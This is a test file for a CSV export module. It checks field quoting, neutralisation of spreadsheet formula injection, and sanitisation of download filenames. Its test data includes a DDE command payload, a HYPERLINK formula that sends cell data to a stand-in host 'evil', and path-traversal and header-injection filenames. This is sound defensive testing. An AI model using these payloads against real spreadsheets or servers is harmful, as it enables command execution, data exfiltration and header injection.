// Batch 3 §8.10 — the CSV writer, executed, with a planted formula payload and
// a legitimate negative number that must survive readable.
//
// The two assertions that matter most are about EXACT BYTES, because both
// failure modes look fine in a summary:
//
//   - the apostrophe must be INSIDE the quotes. `'"=1+1"` looks defended and is
//     malformed; `"'=1+1"` is a text cell;
//   - a negative number is formula-shaped, so it is prefixed too. If that broke
//     the number for a human reader the defence would cost more than it saved,
//     so the prefixed form is asserted character by character.

import { describe, expect, test } from 'vitest';
import {
  CSV_CONTENT_TYPE,
  CSV_LINE_ENDING,
  UTF8_BOM,
  contentDisposition,
  csvField,
  csvRow,
  toCsv,
} from './adminCsv';

describe('RFC 4180 quoting', () => {
  test('a plain field is not quoted', () => {
    expect(csvField('Banani Pharmacy')).toBe('Banani Pharmacy');
  });

  test('a field with a comma is quoted', () => {
    expect(csvField('Dhaka, Bangladesh')).toBe('"Dhaka, Bangladesh"');
  });

  test('a double quote is doubled, inside quotes', () => {
    expect(csvField('the "good" one')).toBe('"the ""good"" one"');
  });

  test('a newline is quoted rather than breaking the row', () => {
    expect(csvField('line one\nline two')).toBe('"line one\nline two"');
    expect(csvField('line one\r\nline two')).toBe('"line one\r\nline two"');
  });

  test('a field with surrounding space is quoted, because Excel trims it otherwise', () => {
    expect(csvField('  padded  ')).toBe('"  padded  "');
  });

  test('an empty field stays empty', () => {
    expect(csvField('')).toBe('');
  });
});

describe('formula injection', () => {
  test.each([
    ['the canonical cmd payload', "=cmd|' /c calc'!A1"],
    ['a HYPERLINK exfiltration', '=HYPERLINK("http://evil/"&A1)'],
    ['a plus-prefixed formula', '+1+1'],
    ['an at-prefixed formula', '@SUM(A1:A9)'],
    ['a tab-prefixed cell', '\tnot a formula to a human'],
    ['a CR-prefixed cell', '\r=1+1'],
  ])('%s is neutralised', (_label, payload) => {
    const field = csvField(payload);

    // Quoted, with the apostrophe INSIDE the quotes.
    expect(field.startsWith('"\'')).toBe(true);
    expect(field.endsWith('"')).toBe(true);
    // And emphatically NOT the other way round, which is the mistake that
    // produces a file that looks defended.
    expect(field.startsWith("'\"")).toBe(false);
  });

  test('the exact bytes for the canonical payload', () => {
    expect(csvField("=cmd|' /c calc'!A1")).toBe('"\'=cmd|\' /c calc\'!A1"');
  });

  test('a LEGITIMATE negative number survives readable', () => {
    // A refund-net total can be negative — packages/utils/netSales.ts allows it
    // deliberately — so this is a real export value, not a hypothetical.
    const field = csvField('-150.00');

    expect(field).toBe('"\'-150.00"');
    // A human opening the file still reads the number, and a spreadsheet reads
    // it as text rather than evaluating it.
    expect(field).toContain('-150.00');
  });

  test('a formula character in the MIDDLE of a cell is left alone', () => {
    // Only the first character starts a formula. Quoting mid-string equals
    // signs would mangle ordinary text.
    expect(csvField('a=b')).toBe('a=b');
    expect(csvField('Napa 500mg + Napa Extra')).toBe('Napa 500mg + Napa Extra');
  });
});

describe('the whole document', () => {
  const document = {
    headers: ['Pharmacy', 'District', 'Net sales'],
    rows: [
      ['Banani Pharmacy', 'Dhaka', '150.00'],
      ['=cmd|calc', 'Dhaka, North', '-20.00'],
      ['', '', ''],
    ],
  };

  test('starts with the UTF-8 BOM, so Excel does not guess the encoding', () => {
    expect(toCsv(document).startsWith(UTF8_BOM)).toBe(true);
    expect(UTF8_BOM).toBe('﻿');
  });

  test('uses CRLF throughout and ends with one', () => {
    const csv = toCsv(document);

    expect(CSV_LINE_ENDING).toBe('\r\n');
    expect(csv.endsWith(CSV_LINE_ENDING)).toBe(true);
    // No bare LF: every LF in this fixture is part of a CRLF pair.
    expect(csv.split('\n').length - 1).toBe(csv.split('\r\n').length - 1);
  });

  test('the header row comes first and the rows follow in order', () => {
    const lines = toCsv(document).slice(UTF8_BOM.length).split(CSV_LINE_ENDING);

    expect(lines[0]).toBe('Pharmacy,District,Net sales');
    expect(lines[1]).toBe('Banani Pharmacy,Dhaka,150.00');
    expect(lines[2]).toBe('"\'=cmd|calc","Dhaka, North","\'-20.00"');
    expect(lines[3]).toBe(',,');
  });

  test('an empty document still carries its headers', () => {
    expect(toCsv({ headers: ['A', 'B'], rows: [] }))
      .toBe(UTF8_BOM + 'A,B' + CSV_LINE_ENDING);
  });

  test('a suppressed cell exports as empty, and empties do not collapse', () => {
    // §8.5's export form is ''. Three empty cells must still be three cells.
    expect(csvRow(['', '', ''])).toBe(',,');
  });
});

describe('the response headers', () => {
  test('the content type names the charset', () => {
    expect(CSV_CONTENT_TYPE).toBe('text/csv; charset=utf-8');
  });

  test('a filename cannot carry a path, a quote or a newline', () => {
    expect(contentDisposition('subscriptions-2026-10-25.csv'))
      .toBe('attachment; filename="subscriptions-2026-10-25.csv"');
    // A dot SURVIVES, because a filename needs its extension. What cannot
    // survive is a path separator, so traversal is impossible even though the
    // dots remain.
    expect(contentDisposition('../../etc/passwd'))
      .toBe('attachment; filename=".._.._etc_passwd"');

    for (const hostile of ['../../etc/passwd', 'a";x="b', 'a\r\nSet-Cookie: x=1', 'C:\\x\\y']) {
      const header = contentDisposition(hostile);
      // Exactly one quoted token, and nothing inside it that could end that
      // token or begin another header.
      expect(header.match(/"/g)).toHaveLength(2);
      const filename = header.slice('attachment; filename="'.length, -1);
      expect(filename).not.toMatch(/["\r\n;/\\]/);
    }
  });

  test('a long filename is bounded', () => {
    expect(contentDisposition('x'.repeat(500)).length).toBeLessThan(140);
  });
});
